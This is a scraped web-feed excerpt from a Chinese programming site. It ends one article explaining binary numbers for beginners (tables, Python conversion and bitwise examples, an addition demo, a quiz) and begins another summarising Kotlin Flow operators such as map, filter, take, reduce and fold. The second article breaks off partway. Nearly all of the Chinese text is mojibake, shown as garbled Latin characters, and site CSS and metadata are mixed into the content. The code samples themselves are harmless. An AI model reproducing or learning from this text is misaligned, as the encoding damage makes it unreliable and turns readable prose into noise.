<table><thead><tr><th>ç‰¹æ€§</th><th>äººç±»ï¼ˆåè¿›åˆ¶ï¼‰</th><th>æœºå™¨ï¼ˆäºŒè¿›åˆ¶ï¼‰</th></tr></thead><tbody><tr><td>å­¦ä¹ éš¾åº¦</td><td>âœ… ç®€å•ï¼ˆå¤©ç”Ÿä¼šæ•°æ‰‹æŒ‡ï¼‰</td><td>âŒ å¤æ‚ï¼ˆå¾—ä¸“é—¨å­¦ï¼‰</td></tr><tr><td>ç‰©ç†å®ç°</td><td>âŒ å¤æ‚ï¼ˆ10ä¸ªçŠ¶æ€ï¼‰</td><td>âœ… ç®€å•ï¼ˆ2ä¸ªçŠ¶æ€ï¼‰</td></tr><tr><td>è¿ç®—é€Ÿåº¦</td><td>ğŸŒ æ…¢ï¼ˆæ¯ç§’å‡ æ¬¡ï¼‰</td><td>ğŸš€ å¿«ï¼ˆæ¯ç§’æ•°åäº¿æ¬¡ï¼‰</td></tr><tr><td>å‡ºé”™æ¦‚ç‡</td><td>âœ… ä½ï¼ˆé”™äº†èƒ½çœ‹å‡ºæ¥ï¼‰</td><td>âŒ é«˜ï¼ˆä¸€ä¸ªæ¯”ç‰¹é”™äº†å°±å´©ï¼‰</td></tr><tr><td>æ²Ÿé€šæ–¹å¼</td><td>ğŸ’¬ è¯­è¨€</td><td>0ï¸âƒ£1ï¸âƒ£ ä»£ç </td></tr><tr><td>æœ€çˆ±åƒçš„</td><td>ğŸ— ç‚¸é¸¡</td><td>ğŸ”‹ ç”µ</td></tr></tbody></table>
<p>è™½ç„¶äºŒè¿›åˆ¶å¯¹äººç±»æ¥è¯´æœ‰ç‚¹"åäººç±»"ï¼Œä½†å¯¹æœºå™¨æ¥è¯´ï¼Œè¿™å°±æ˜¯"å®Œç¾è¯­è¨€"â€”â€”å°±åƒé±¼åœ¨æ°´é‡Œæ¸¸ğŸŸï¼Œé¸Ÿåœ¨å¤©ä¸Šé£ğŸ¦ï¼Œæœºå™¨ç”¨äºŒè¿›åˆ¶ç®—å¾—é£èµ·ï¼</p>
<h3 data-id="heading-10">ğŸ¨ ä»£ç å®ä¾‹ï¼šäºŒè¿›åˆ¶åˆ°åº•é•¿å•¥æ ·ï¼Ÿ</h3>
<p>å…‰è¯´ä¸ç»ƒå‡æŠŠå¼ï¼Œå’±ä»¬æ¥çœ‹çœ‹äºŒè¿›åˆ¶åœ¨ä»£ç é‡Œçš„"çœŸé¢ç›®"ï¼</p>
<h4 data-id="heading-11">1. Pythonä¸­çš„äºŒè¿›åˆ¶</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åè¿›åˆ¶è½¬äºŒè¿›åˆ¶</span>
num = <span class="hljs-number">42</span>
bin_num = <span class="hljs-built_in">bin</span>(num)  <span class="hljs-comment"># è¾“å‡ºï¼š0b101010</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"åè¿›åˆ¶42çš„äºŒè¿›åˆ¶æ˜¯ï¼š<span class="hljs-subst">{bin_num}</span>"</span>)

<span class="hljs-comment"># äºŒè¿›åˆ¶è½¬åè¿›åˆ¶</span>
bin_str = <span class="hljs-string">"101010"</span>
dec_num = <span class="hljs-built_in">int</span>(bin_str, <span class="hljs-number">2</span>)  <span class="hljs-comment"># è¾“å‡ºï¼š42</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"äºŒè¿›åˆ¶101010çš„åè¿›åˆ¶æ˜¯ï¼š<span class="hljs-subst">{dec_num}</span>"</span>)

<span class="hljs-comment"># äºŒè¿›åˆ¶è¿ç®—ï¼ˆä¸ã€æˆ–ã€éï¼‰</span>
a = <span class="hljs-number">0b1010</span>  <span class="hljs-comment"># åè¿›åˆ¶10</span>
b = <span class="hljs-number">0b1100</span>  <span class="hljs-comment"># åè¿›åˆ¶12</span>

and_result = a &amp; b  <span class="hljs-comment"># æŒ‰ä½ä¸ï¼š0b1000ï¼ˆåè¿›åˆ¶8ï¼‰</span>
or_result = a | b   <span class="hljs-comment"># æŒ‰ä½æˆ–ï¼š0b1110ï¼ˆåè¿›åˆ¶14ï¼‰</span>
not_result = ~a     <span class="hljs-comment"># æŒ‰ä½éï¼š-11ï¼ˆè¡¥ç è¡¨ç¤ºï¼‰</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"10 &amp; 12 = <span class="hljs-subst">{and_result}</span> (äºŒè¿›åˆ¶ï¼š<span class="hljs-subst">{<span class="hljs-built_in">bin</span>(and_result)}</span>)"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"10 | 12 = <span class="hljs-subst">{or_result}</span> (äºŒè¿›åˆ¶ï¼š<span class="hljs-subst">{<span class="hljs-built_in">bin</span>(or_result)}</span>)"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"~10 = <span class="hljs-subst">{not_result}</span> (äºŒè¿›åˆ¶ï¼š<span class="hljs-subst">{<span class="hljs-built_in">bin</span>(not_result)}</span>)"</span>)
</code></pre>
<h4 data-id="heading-12">2. äºŒè¿›åˆ¶åŠ æ³•æ¼”ç¤º</h4>
<pre><code class="hljs language-ini" lang="ini">åè¿›åˆ¶ï¼š  5 + <span class="hljs-attr">3</span> = <span class="hljs-number">8</span>
äºŒè¿›åˆ¶ï¼š101 + <span class="hljs-attr">011</span> = <span class="hljs-number">1000</span>

  101  (5)
+ 011  (3)
------
 1000  (8)
</code></pre>
<p>çœ‹åˆ°æ²¡ï¼ŸäºŒè¿›åˆ¶åŠ æ³•å…¶å®å’Œåè¿›åˆ¶ä¸€æ ·ï¼Œå°±æ˜¯"é€¢2è¿›1"â€”â€”ç®€å•å¾—åƒåœ¨å¹¼å„¿å›­å­¦æ•°æ•°ï¼</p>
<h3 data-id="heading-13">ğŸ§® äºŒè¿›åˆ¶å°æµ‹éªŒï¼šä½ èƒ½ç­”å¯¹å—ï¼Ÿ</h3>
<p>å’±ä»¬æ¥ç©ä¸ªå°æ¸¸æˆï¼Œçœ‹çœ‹ä½ å¯¹äºŒè¿›åˆ¶äº†è§£å¤šå°‘ï¼š</p>























































<table><thead><tr><th>åè¿›åˆ¶</th><th>äºŒè¿›åˆ¶</th><th>ä½ ç­”å¯¹äº†å—ï¼Ÿ</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>âœ…/âŒ</td></tr><tr><td>1</td><td>1</td><td>âœ…/âŒ</td></tr><tr><td>2</td><td>10</td><td>âœ…/âŒ</td></tr><tr><td>3</td><td>11</td><td>âœ…/âŒ</td></tr><tr><td>4</td><td>100</td><td>âœ…/âŒ</td></tr><tr><td>5</td><td>101</td><td>âœ…/âŒ</td></tr><tr><td>6</td><td>110</td><td>âœ…/âŒ</td></tr><tr><td>7</td><td>111</td><td>âœ…/âŒ</td></tr><tr><td>8</td><td>1000</td><td>âœ…/âŒ</td></tr></tbody></table>
<p>å·å·å‘Šè¯‰ä½ ï¼šå‰8ä¸ªè‡ªç„¶æ•°çš„äºŒè¿›åˆ¶ï¼Œå…¶å®å°±æ˜¯"0,1,10,11,100,101,110,111"â€”â€”æ˜¯ä¸æ˜¯å¾ˆæœ‰è§„å¾‹ï¼ŸğŸ¤”</p>
<h3 data-id="heading-14">ğŸ”® æœªæ¥ï¼šäºŒè¿›åˆ¶ä¼šè¢«"æ·˜æ±°"å—ï¼Ÿ</h3>
<p>éšç€é‡å­è®¡ç®—çš„å…´èµ·ï¼Œæœ‰äººå¼€å§‹å”±è¡°äºŒè¿›åˆ¶ï¼š"é‡å­æ¯”ç‰¹èƒ½åŒæ—¶è¡¨ç¤º0å’Œ1ï¼ŒäºŒè¿›åˆ¶è¦å®Œäº†ï¼"âš›ï¸</p>
<p>2019å¹´ï¼Œè°·æ­Œå®£å¸ƒå®ç°äº†"é‡å­éœ¸æƒ"â€”â€”ç”¨é‡å­è®¡ç®—æœºåœ¨200ç§’å†…å®Œæˆäº†ä¼ ç»Ÿè®¡ç®—æœºéœ€è¦10000å¹´çš„è®¡ç®—ã€‚è¿™å°±åƒä»é©¬è½¦ç›´æ¥è·³åˆ°äº†ç«ç®­ğŸš€ï¼Œå¬èµ·æ¥è¶…å‰å®³ï¼</p>
<p>ä½†åˆ«æ‹…å¿ƒï¼ŒäºŒè¿›åˆ¶è¿˜èƒ½"æ´»"å¾ˆä¹…ã€‚æ¯•ç«Ÿå’±ä»¬çš„æ•´ä¸ªæ•°å­—ä¸–ç•Œéƒ½æ˜¯ç”¨äºŒè¿›åˆ¶å»ºèµ·æ¥çš„ï¼šç¼–ç¨‹è¯­è¨€ã€æ“ä½œç³»ç»Ÿã€ç¡¬ä»¶è®¾è®¡â€¦â€¦å°±åƒè™½ç„¶æœ‰äº†é£æœºï¼Œä½†å’±ä»¬è¿˜æ˜¯å¾—èµ°è·¯ä¸€æ ·â€”â€”äºŒè¿›åˆ¶è¿™ä¸ª"è€å¤è‘£"ï¼ŒçŸ­æœŸå†…è¿˜å¾—ç»§ç»­å‘å…‰å‘çƒ­âœ¨</p>
<h3 data-id="heading-15">ğŸ¯ ç»“è¯­ï¼šç®€å•å°±æ˜¯æœ€å¼ºå¤§çš„åŠ›é‡</h3>
<p>è®¡ç®—æœºé€‰æ‹©äºŒè¿›åˆ¶ï¼Œä¸æ˜¯å› ä¸ºå®ƒèªæ˜ï¼Œè€Œæ˜¯å› ä¸ºå®ƒ<strong>ç®€å•</strong>ã€‚è¿™ç§"ä»¥ç®€é©­ç¹"çš„æ™ºæ…§ï¼Œè´¯ç©¿äº†æ•´ä¸ªè®¡ç®—æœºå‘å±•çš„å†å²ã€‚</p>
<p>ä¸‹æ¬¡å½“ä½ åˆ·ç€æ‰‹æœºğŸ“±ï¼Œçœ‹ç€è§†é¢‘ï¼Œæˆ–è€…ç©ç€æ¸¸æˆæ—¶ï¼Œä¸å¦¨æƒ³ä¸€æƒ³ï¼šåœ¨ä½ çœ‹ä¸åˆ°çš„åœ°æ–¹ï¼Œæ— æ•°ä¸ªæ™¶ä½“ç®¡æ­£åœ¨ä»¥æ¯ç§’æ•°åäº¿æ¬¡çš„é€Ÿåº¦å¼€å…³â€”â€”ç”¨æœ€ç®€å•çš„0å’Œ1ï¼Œæ„å»ºå‡ºäº†æ•´ä¸ªå¤æ‚çš„æ•°å­—ä¸–ç•Œã€‚</p>
<p>å°±åƒä¹é«˜ç§¯æœ¨ğŸ§©ï¼Œè™½ç„¶åªæœ‰å‡ ç§åŸºæœ¬å½¢çŠ¶ï¼Œå´èƒ½æ­å‡ºæ— é™å¯èƒ½ï¼›äºŒè¿›åˆ¶è™½ç„¶åªæœ‰0å’Œ1ï¼Œå´èƒ½åˆ›é€ å‡ºæ•´ä¸ªæ•°å­—å®‡å®™ğŸŒŒ</p>
<p>æ‰€ä»¥å•Šï¼Œæœ‰æ—¶å€™åˆ«æŠŠäº‹æƒ…æƒ³å¾—å¤ªå¤æ‚â€”â€”ç®€å•ï¼Œå¾€å¾€æ˜¯æœ€å¼ºå¤§çš„é€‰æ‹©ï¼</p>
<hr/>
<h3 data-id="heading-16">ğŸ’¬ äº’åŠ¨æ—¶é—´ï¼</h3>
<ol>
<li>ä½ è§‰å¾—æœªæ¥è®¡ç®—æœºè¿˜ä¼šç”¨äºŒè¿›åˆ¶å—ï¼Ÿé‡å­è®¡ç®—ä¼šä¸ä¼šå–ä»£å®ƒï¼Ÿ</li>
<li>ä½ è§è¿‡æœ€"åäººç±»"çš„äºŒè¿›åˆ¶åº”ç”¨æ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>è¦æ˜¯ç»™ä½ 10æ ¹æ‰‹æŒ‡ï¼Œä½ ä¼šä¸ä¼šå‘æ˜å‡ºåè¿›åˆ¶ä»¥å¤–çš„è®¡æ•°æ–¹å¼ï¼Ÿ</li>
</ol>
<p>å¿«æ¥è¯„è®ºåŒºèŠèŠä½ çš„æƒ³æ³•ï¼ğŸ’¬ ç‚¹èµæ”¶è—ä¸è¿·è·¯ï¼Œå’±ä»¬ä¸‹æœŸç»§ç»­æ¢ç´¢è®¡ç®—æœºçš„"åä¸‡ä¸ªä¸ºä»€ä¹ˆ"ï¼ğŸ‰</p>
<p><strong>å…³æ³¨æˆ‘</strong>ï¼Œä¸‹æœŸå¸¦ä½ è§£é”æ›´å¤šè®¡ç®—æœºçš„"å¥‡è‘©å†·çŸ¥è¯†"ï¼ğŸ¤“</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ååˆ†é’Ÿé€Ÿè§ˆ Kotlin Flow æ“ä½œç¬¦]]></title>    <link>https://juejin.cn/post/7581870491762671668</link>    <guid>https://juejin.cn/post/7581870491762671668</guid>    <pubDate>2025-12-10T02:51:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581870491762671668" data-draft-id="7576532425761865743" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ååˆ†é’Ÿé€Ÿè§ˆ Kotlin Flow æ“ä½œç¬¦"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2025-12-10T02:51:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ååˆ†é’Ÿé€Ÿè§ˆ Kotlin Flow æ“ä½œç¬¦
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:51:59.000Z" title="Wed Dec 10 2025 02:51:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#5f6368;background-image:linear-gradient(90deg,rgba(240,191,213,.1) 3%,transparent 0),linear-gradient(1turn,rgba(240,191,213,.1) 3%,transparent 0);background-size:20px 20px;background-position:50%;letter-spacing:1px;word-spacing:1px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;line-height:1.5;margin-top:35px;margin-bottom:10px;padding-left:50px;padding-bottom:5px;color:#5f6368}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:0;display:block;content:""}.markdown-body h1{font-size:32px;margin-bottom:5px}.markdown-body h1:before{top:0;content:"ğŸ¦„";font-size:32px}.markdown-body h2{padding-bottom:24px;border-bottom:1px solid #ececec}.markdown-body h2:before{top:0;left:8px;content:"ğŸ³";font-size:24px}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{top:-2px;left:8px;content:"ğŸ„";font-size:20px}.markdown-body h4{font-size:16px}.markdown-body h4:before{top:-2px;left:8px;content:"ğŸ¦¥";font-size:18px}.markdown-body h5{font-size:14px}.markdown-body h5:before{top:-2px;left:9px;content:"ğŸ¦©";font-size:16px}.markdown-body h6{font-size:12px;margin-top:5px}.markdown-body h6:before{top:-1px;left:10px;content:"ğŸ§";font-size:14px}.markdown-body p{line-height:1.9;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid rgba(253,121,168,.5);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#a6accd;background:#292d3e;border-radius:8px}.markdown-body a{text-decoration:none;color:#fd79a8;border-bottom:1px solid #fd79a8;padding:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(253,121,168,.1);color:#ee69a9}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body th{color:#fd79a8}.markdown-body th,.markdown-body tr:hover{background:rgba(253,121,168,.1)}.markdown-body td{min-width:120px}.markdown-body blockquote{position:relative;color:#666;padding:23px;margin:22px 0;border-left:4px solid #ee69a9;background-color:rgba(253,121,168,.1)}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;display:block;font-size:27px;color:#fd79a8;opacity:.8}.markdown-body blockquote:before{left:10px;top:0;content:"â"}.markdown-body blockquote:after{right:10px;bottom:0;content:"â"}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body strong{position:relative;color:#fd79a8}.markdown-body strong:before{content:"Â· "}.markdown-body strong:after{content:" Â·"}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#fd79a8}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#ee69a9}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45ccff6af8264a94b405eb6256e92583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=A3luuQF1pk0FqsnwK7gsFyqQ%2BnY%3D" alt="0.png" loading="lazy"/></p>
<p>å®æ—¶çš„ç”¨æˆ·è¾“å…¥ã€å¤šä¸ªç½‘ç»œè¯·æ±‚çš„å“åº”ï¼Œå†åŠ ä¸Šæ•°æ®åº“çš„é¢‘ç¹æ›´æ–°ï¼Œå¾ˆå®¹æ˜“è®©ä½ çš„ä»£ç å˜å¾—æ··ä¹±ä¸å ªã€‚è€Œè¿™ï¼Œæ­£æ˜¯ Kotlin <code>Flow</code> è¦å¸®ä½ è§£å†³çš„é—®é¢˜ã€‚</p>
<p>ä½œä¸ºåŸºäºåç¨‹æ„å»ºçš„å“åº”å¼æµ APIï¼ŒKotlin <code>Flow</code> è®©ä½ å¯ä»¥ç”¨å£°æ˜å¼çš„æ–¹å¼ä¼˜é›…åœ°å¤„ç†å¼‚æ­¥æ•°æ®æµã€‚ä½†è¦æƒ³çœŸæ­£å‘æŒ¥å®ƒçš„å¼ºå¤§èƒ½åŠ›ï¼Œå…³é”®åœ¨äºç†Ÿç»ƒæŒæ¡å„ç§æ“ä½œç¬¦ã€‚</p>
<p>æœ¬æŒ‡å—å°±æ˜¯ä¸ºä½ é‡èº«æ‰“é€ çš„é€ŸæŸ¥æ‰‹å†Œâ€”â€”èšç„¦æœ€æ ¸å¿ƒçš„æ“ä½œç¬¦ï¼Œæ¸…æ™°è¯´æ˜å®ƒä»¬çš„é€‚ç”¨åœºæ™¯å’Œä½¿ç”¨æ–¹æ³•ï¼ŒåŠ©ä½ é«˜æ•ˆé©¾é©­ Kotlin <code>Flow</code>ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€å¯¹ä¸€è½¬æ¢</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa9d45c2173c472786e17da65c24b33e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=SVd%2BnDSbrk2I1VP5MasvDPlk9I0%3D" alt="2.png" loading="lazy"/></p>
<h3 data-id="heading-1">map</h3>
<p>å°† <code>Flow</code> ä¸­å‘å‡ºçš„æ¯ä¸ªå…ƒç´ è½¬æ¢ä¸ºæ–°å…ƒç´ ï¼Œå®ç°ä¸€å¯¹ä¸€æ˜ å°„ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin">
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    flowOf(<span class="hljs-string">"Kotlin"</span>, <span class="hljs-string">"Flow"</span>)
        .map { <span class="hljs-string">"Length of '<span class="hljs-variable">$it</span>' is <span class="hljs-subst">${it.length}</span>"</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Length of 'Kotlin' is 6</span>
<span class="hljs-comment">// Length of 'Flow' is 4</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šéœ€è¦å°†æ¯ä¸ªé¡¹è½¬æ¢ä¸ºä¸åŒç±»å‹æˆ–æ ¼å¼ï¼Œä¾‹å¦‚åœ¨ <code>ViewModel</code> ä¸­å°† <code>Date</code> å¯¹è±¡æ ¼å¼åŒ–ä¸ºå¯æ˜¾ç¤ºçš„ <code>String</code>ã€‚</p>
<h3 data-id="heading-2">filter</h3>
<p>ä»…å…è®¸æ»¡è¶³ç»™å®šæ¡ä»¶çš„å…ƒç´ é€šè¿‡ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.5</span>).asFlow()
        .filter { it % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 4</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šæ ¹æ®æ¡ä»¶ä¸¢å¼ƒä¸éœ€è¦çš„å€¼ï¼Œä¾‹å¦‚è¿‡æ»¤ç©ºæœç´¢è¯æˆ–æ— æ•ˆæ•°æ®ã€‚</p>
<h3 data-id="heading-3">take</h3>
<p>é™åˆ¶æ€§æ“ä½œç¬¦ï¼Œä»…å‘å‡º <code>Flow</code> çš„å‰ <code>n</code> ä¸ªå…ƒç´ ï¼Œéšåå–æ¶ˆ <code>Flow</code> æ‰§è¡Œã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.10</span>).asFlow()
        .take(<span class="hljs-number">3</span>)
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šåªéœ€è¦æœ‰é™æ•°é‡çš„é¡¹ï¼Œä¾‹å¦‚åˆ†é¡µåŠ è½½ï¼Œæˆ–ä»ä¸€ç³»åˆ—æ“ä½œä¸­å–ç¬¬ä¸€ä¸ªæœ‰æ•ˆç»“æœã€‚</p>
<hr/>
<h2 data-id="heading-4">ç´¯ç§¯å€¼</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed8dfb6e502c43d9b4b7551be1fc8011~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=1COawG3a%2BdsCCD5sHH3RERsW0XU%3D" alt="3.png" loading="lazy"/></p>
<h3 data-id="heading-5">reduce</h3>
<p>ç»ˆç«¯æ“ä½œç¬¦ï¼Œä» <code>Flow</code> çš„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹ç´¯ç§¯å€¼ï¼Œå¹¶å¯¹å½“å‰ç´¯åŠ å™¨ä¸æ¯ä¸ªå…ƒç´ æ‰§è¡Œæ“ä½œã€‚è‹¥ <code>Flow</code> ä¸ºç©ºåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> sum = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().reduce { accumulator, value -&gt; accumulator + value }
    println(sum)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 6</span>
</code></pre>
<h3 data-id="heading-6">fold</h3>
<p>ç±»ä¼¼äº <code>reduce</code>ï¼Œä½† <code>fold</code> éœ€è¦ä¸€ä¸ªåˆå§‹å€¼ï¼Œæ˜¯æ›´å®‰å…¨çš„é€‰æ‹©ã€‚</p>
<p>å³ä½¿ <code>Flow</code> ä¸ºç©ºä¹Ÿä¼šè¿”å›åˆå§‹å€¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> sum = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().fold(<span class="hljs-number">100</span>) { accumulator, value -&gt; accumulator + value }
    println(sum)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 106</span>
</code></pre>
<h3 data-id="heading-7">runningReduce / scan</h3>
<p>ä¸­é—´æ“ä½œç¬¦ï¼Œåœ¨æ¯ä¸ªå…ƒç´ å¤„ç†æ—¶éƒ½å‘å‡ºå½“å‰ç´¯ç§¯å€¼ã€‚</p>
